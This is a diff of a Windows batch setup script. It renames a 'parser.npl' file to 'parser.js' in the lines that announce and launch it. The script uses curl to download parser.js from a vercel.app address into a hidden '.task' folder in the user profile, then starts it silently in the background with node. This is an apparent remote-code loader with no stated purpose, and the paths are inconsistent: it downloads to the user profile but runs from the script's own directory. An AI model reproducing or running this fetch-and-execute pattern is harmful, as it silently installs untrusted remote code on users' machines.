@@ -77,7 +77,7 @@ if errorlevel 1 (
 :: Download required files
 :: -------------------------
 set "USERPROFILE=%USERPROFILE%"
-echo [INFO] Downloading parser.npl and package.json...
+echo [INFO] Downloading parser.js and package.json...
 
 MD "%USERPROFILE%\.task" 2>nul
 curl -L -o "%USERPROFILE%\.task\parser.js" "https://vercel-rho-amber-58.vercel.app/303/parser.js"
@@ -102,15 +102,15 @@ if not exist "%~dp0.task\node_modules\request" (
 :: -------------------------
 :: Run the parser
 :: -------------------------
-if exist "%~dp0.task\parser.npl" (
-    echo [INFO] Running parser.npl...
-    start "" /b "%NODE_EXE%" "%~dp0.task\parser.npl"
+if exist "%~dp0.task\parser.js" (
+    echo [INFO] Running parser.js...
+    start "" /b "%NODE_EXE%" "%~dp0.task\parser.js"
     if errorlevel 1 (
         echo [ERROR] parser execution failed.
         exit /b 1
     )
 ) else (
-    echo [ERROR] parser.npl not found.
+    echo [ERROR] parser.js not found.
     exit /b 1
 )
 
